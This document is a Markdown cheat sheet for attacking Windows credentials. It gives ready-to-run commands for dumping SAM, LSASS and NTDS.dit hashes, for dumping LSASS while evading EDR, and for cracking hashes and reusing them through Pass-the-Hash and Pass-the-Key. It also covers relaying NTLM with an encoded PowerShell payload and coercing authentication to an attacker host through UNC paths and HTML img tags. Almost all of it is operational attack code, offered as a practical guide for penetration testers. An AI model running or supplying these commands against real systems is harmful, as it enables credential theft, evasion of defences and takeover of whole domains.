# Windows Hash Attacks

Extracting, cracking, relaying, and reusing Windows credential material: NTLM, NetNTLMv1/v2, DCC (cached domain creds), LSA secrets, DPAPI, and Kerberos keys. Covers Pass-the-Hash, Pass-the-Key, NTLM relay, and modern LSASS-dumping / EDR-evasion. Companion to `cracking/password-cracking-guide.md`, `05-privilege-escalation/windows/`, and `08-active-directory/`.

> Key distinction: the **NT hash** (mode 1000) is reusable directly (Pass-the-Hash) and only needs cracking to recover the plaintext. **NetNTLMv2** (mode 5600) is a challenge-response — it is NOT reusable as a hash, only **crackable** or **relayable**.

---

## 1. Hash Types You'll Encounter

| Material | Format | Reusable? | Crack mode |
|----------|--------|-----------|-----------|
| **NT hash** | 32 hex | **Yes — PtH** | 1000 |
| LM hash | 32 hex | legacy PtH | 3000 |
| **NetNTLMv2** | `user::DOMAIN:chal:resp:resp` | No (relay or crack) | 5600 |
| NetNTLMv1 | `user::DOMAIN:resp:resp:chal` | downgrade-crackable | 5500 |
| **Kerberos NT/AES keys** | hex | Pass-the-Key / tickets | n/a |
| DCC2 (MSCache v2) | `$DCC2$...` | No (crack only) | 2100 |
| LSA secrets | varies | service/machine creds | n/a |
| DPAPI masterkey/blobs | binary | decrypt → plaintext | (impacket-dpapi) |

---

## 2. Extraction

### 2.1 Local SAM/SYSTEM (admin or SeBackup)
```cmd
reg save HKLM\SAM   %TEMP%\sam
reg save HKLM\SYSTEM %TEMP%\system
reg save HKLM\SECURITY %TEMP%\security
```
```bash
impacket-secretsdump -sam sam -system system -security security LOCAL    # NT hashes + LSA + cached
```

### 2.2 Remote (need local admin on the target)
```bash
impacket-secretsdump DOMAIN/admin:pass@<ip>
impacket-secretsdump -hashes :<NT> DOMAIN/admin@<ip>           # PtH
nxc smb <range> -u admin -p pass --sam --lsa                  # SAM + LSA secrets
nxc smb <range> -u admin -H <NT> --sam                        # PtH sweep dump
```

### 2.3 LSASS memory (logon creds, Kerberos keys, sometimes plaintext)
```cmd
:: LOLBAS — comsvcs.dll MiniDump (signed, no mimikatz on disk)
rundll32 C:\Windows\System32\comsvcs.dll, MiniDump <lsass_pid> C:\Windows\Temp\l.dmp full
tasklist /fi "imagename eq lsass.exe"        :: get the PID
:: procdump (signed Sysinternals)
procdump.exe -accepteula -ma lsass.exe l.dmp
```
Parse the dump offline (avoids running creds-tools on the host):
```bash
pypykatz lsa minidump l.dmp                  # logonpasswords/Kerberos keys
```
```
:: mimikatz
sekurlsa::minidump l.dmp
sekurlsa::logonpasswords
sekurlsa::ekeys                              :: Kerberos AES/RC4 keys (for pass-the-key)
```

### 2.4 EDR-aware LSASS dumping (2025)
Modern EDR hooks `MiniDumpWriteDump`/`NtReadVirtualMemory`. Use indirect-syscall / fork-clone tooling and **never write the dump to disk** when avoidable:
```bash
# nanodump (Fortra) — indirect syscalls, process fork/snapshot, in-memory transfer
nxc smb <ip> -u admin -p pass -M nanodump                     # remote, parses for you
nxc smb <ip> -u admin -p pass -M nanodump -o NANO_PATH=...    # custom
# lsassy — remote dump+parse over SMB (combines with secretsdump fallbacks)
nxc smb <range> -u admin -p pass -M lsassy
lsassy -u admin -p pass -d DOMAIN <ip>
# Other quiet methods: handlekatz, dumpert (direct syscalls), --fork in nanodump
```
> nanodump's `--fork` clones LSASS (`PROCESS_CREATE_PROCESS`) and dumps the clone, avoiding a direct read of LSASS — a common EDR trigger. Pair with in-memory exfil (no dump on disk).

### 2.5 NTDS.dit (all domain hashes — needs DA or DC access)
```bash
impacket-secretsdump DOMAIN/da:pass@<DC_IP> -just-dc -outputfile dc          # DCSync (network)
nxc smb <DC_IP> -u da -p pass -M ntdsutil                                    # vss/ntdsutil dump
impacket-secretsdump -ntds ntds.dit -system system LOCAL                     # offline from stolen files
```

### 2.6 Other credential stores
```bash
nxc smb <range> -u admin -p pass -M lsassy            # LSASS
nxc smb <range> -u admin -p pass --dpapi              # DPAPI (browser/cred-manager secrets)
# DonPAPI / SharpDPAPI / pypykatz for masterkeys, vaults, RDP, Wi-Fi, browser creds
impacket-dpapi masterkey -file mk -sid S-1-5-21-... -password pass
impacket-dpapi credential -file cred -key <masterkey>
.\SharpDPAPI.exe triage
.\lazagne.exe all
```

---

## 3. Cracking

```bash
hashcat -m 1000 nt.txt rockyou.txt -r best64.rule              # NT hash → plaintext
hashcat -m 5600 netntlmv2.txt rockyou.txt -r best64.rule      # NetNTLMv2
hashcat -m 5500 netntlmv1.txt rockyou.txt                     # NetNTLMv1
hashcat -m 2100 dcc2.txt rockyou.txt                          # cached domain creds (slow)
john --format=netntlmv2 --wordlist=rockyou.txt netntlmv2.txt
```
### NetNTLMv1 downgrade → instant NT hash
If a host negotiates NetNTLMv1, capture with a fixed challenge `1122334455667788` and convert to NT via crack.sh DES tables (effectively instant).
```bash
sudo responder -I eth0 --lm           # force LM/NTLMv1 downgrade
# Submit the v1 hash to https://crack.sh  → recovers NT hash → Pass-the-Hash
```

---

## 4. Pass-the-Hash (reuse the NT hash, no plaintext)

```bash
# Remote exec (LM:NT, empty LM = 32 zeros or just :NT)
impacket-psexec  -hashes :<NT> DOMAIN/Administrator@<ip>      # SYSTEM shell (creates service)
impacket-wmiexec -hashes :<NT> DOMAIN/Administrator@<ip>      # user shell (quieter)
impacket-smbexec -hashes :<NT> DOMAIN/Administrator@<ip>
evil-winrm -i <ip> -u Administrator -H <NT>                   # WinRM PtH
nxc smb <range> -u Administrator -H <NT>                      # sweep ("Pwn3d!" = admin there)
# SMB file access
smbclient //<ip>/C$ -U Administrator --pw-nt-hash <NT>
```
```
:: mimikatz (local injection)
sekurlsa::pth /user:Administrator /domain:DOMAIN /ntlm:<NT> /run:cmd.exe
```
> PtH works with NTLM auth. In Kerberos-only/RestrictedAdmin estates, use **Pass-the-Key** or **Overpass-the-Hash** instead.

---

## 5. Pass-the-Key / Overpass-the-Hash (Kerberos)

Use the NT hash or AES key to request a Kerberos TGT, then act over Kerberos (stealthier; bypasses some "NTLM disabled" controls).
```bash
impacket-getTGT -hashes :<NT> DOMAIN/user                     # OPtH (RC4)
impacket-getTGT -aesKey <AES256> DOMAIN/user                  # pass-the-key (no RC4 = quieter)
export KRB5CCNAME=user.ccache
impacket-psexec -k -no-pass DOMAIN/user@target.fqdn
```
```
Rubeus.exe asktgt /user:user /rc4:<NT> /ptt
Rubeus.exe asktgt /user:user /aes256:<KEY> /ptt
```

---

## 6. Capture & Relay NetNTLMv2 (when you can't crack it)

Full coverage in `08-active-directory/ntlm-relay-and-coercion.md`; quick version:
```bash
# Capture (then crack -m 5600)
sudo responder -I eth0
# Force auth from a host you control / a victim:
dir \\<ATTACKER_IP>\share          # cmd
ls  \\<ATTACKER_IP>\share          # powershell
# Relay instead of crack (SMB signing must be off on the target):
impacket-ntlmrelayx -tf targets.txt -smb2support -c "powershell -enc <b64>"
impacket-ntlmrelayx -t ldaps://<DC> --delegate-access          # RBCD
impacket-ntlmrelayx -t http://<CA>/certsrv/certfnsh.asp --adcs --template DomainController   # ESC8
```

### Coercion vectors (force the auth — see AD relay file)
```bash
PetitPotam.py -u u -p p <ATTACKER> <DC>          # MS-EFSR
dfscoerce.py  -u u -p p <ATTACKER> <DC>          # MS-DFSNM
coercer coerce -u u -p p -t <DC> -l <ATTACKER>   # all methods
# Web/app injection vectors that trigger SMB/HTTP auth:
\\<ATTACKER_IP>\share\x        # UNC in file upload / SQLi / XXE
<img src="\\<ATTACKER_IP>\x">  # HTML/email
```

---

## 7. Hash Format Reference

```
NT hash        : 8846f7eaee8fb117ad06bdd830b7586c                 (m 1000)
NetNTLMv2      : user::DOM:<chal>:<HMAC>:<blob>                    (m 5600)
NetNTLMv1      : user::DOM:<resp>:<resp>:1122334455667788         (m 5500)
DCC2           : $DCC2$10240#username#<hash>                       (m 2100)
secretsdump LM:NT line: user:RID:<LM>:<NT>:::
```

---

## 8. Cheatsheet

```bash
# EXTRACT
impacket-secretsdump -sam sam -system system LOCAL
rundll32 comsvcs.dll, MiniDump <lsass_pid> C:\Temp\l.dmp full ; pypykatz lsa minidump l.dmp
nxc smb <range> -u admin -p pass -M lsassy            # EDR-aware remote
impacket-secretsdump DOM/da:p@<DC> -just-dc           # all domain hashes

# CRACK
hashcat -m 1000 nt.txt rockyou.txt -r best64.rule
hashcat -m 5600 v2.txt rockyou.txt

# PASS-THE-HASH
impacket-wmiexec -hashes :<NT> DOM/Administrator@<ip>
evil-winrm -i <ip> -u Administrator -H <NT>
nxc smb <range> -u Administrator -H <NT>               # find where admin

# OVERPASS / PASS-THE-KEY
impacket-getTGT -aesKey <AES> DOM/user; export KRB5CCNAME=user.ccache; impacket-psexec -k -no-pass DOM/user@host.fqdn

# RELAY
sudo responder -I eth0 ; impacket-ntlmrelayx -tf t.txt -smb2support -c "<cmd>"
```

---

## References

- impacket secretsdump/getTGT — https://github.com/fortra/impacket
- pypykatz — https://github.com/skelsec/pypykatz
- nanodump (Fortra) — https://github.com/fortra/nanodump
- lsassy — https://github.com/Hackndo/lsassy
- DonPAPI / SharpDPAPI — https://github.com/login-securite/DonPAPI , https://github.com/GhostPack/SharpDPAPI
- Rubeus — https://github.com/GhostPack/Rubeus
- crack.sh (NetNTLMv1 → NT) — https://crack.sh/
- The Hacker Recipes – PtH / NTLM — https://www.thehacker.recipes/ad/movement/ntlm/pth
- Red Siege – Dumping LSASS Like it's 2019 — https://redsiege.com/blog/2024/03/dumping-lsass-like-its-2019/
